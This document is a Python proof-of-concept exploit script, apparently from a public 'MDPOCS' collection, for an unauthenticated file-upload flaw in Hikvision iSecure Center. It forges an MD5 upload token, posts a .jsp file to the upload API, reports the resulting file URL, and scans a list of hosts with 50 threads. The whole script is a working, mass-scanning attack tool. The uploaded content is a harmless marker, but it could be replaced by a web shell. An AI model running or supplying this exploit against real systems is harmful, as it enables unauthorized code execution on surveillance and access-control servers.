#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# icon_hash="-911494769"

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                   +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                           +')
    print(
        '+ EXP: python3 Hikvison_iSecure_Center_Upload_File.py url.txt                                                         +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
def exp(host):
    url = host
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo",
        "Cookie": "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169"
    }
    data ='------WebKitFormBoundaryGEJwiloiPo\r\nContent-Disposition: form-data; name="fileUploader";filename="mdtest.jsp"\r\nContent-Type: image/jpeg\r\n\r\nmdsec\r\n------WebKitFormBoundaryGEJwiloiPo'
    vulurl = "http://"+url + "/eps/api/resourceOperations/upload?token="
    try:
        md5url="http://"+url+"/eps/api/resourceOperations/uploadsecretKeyIbuilding"
        token =  hashlib.md5(md5url.encode(encoding='UTF-8')).hexdigest()
        r = requests.post(vulurl+""+token.upper(), headers=headers,data=data)
        path = r.text.replace('\"',"").replace('{',"").replace('}',"").split('resourceUuid:')[1].split(",resourceType")[0]
        print(r.text)
        if r.status_code==200 and "success" in r.text :
            print("http://"+host+":true 文件地址为："+"{} ".format(url+"/eps/upload/"+path+".jsp"))
        else:
            return 0
            print (host+":false")
    except:
        print (host+":false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(exp, row[0])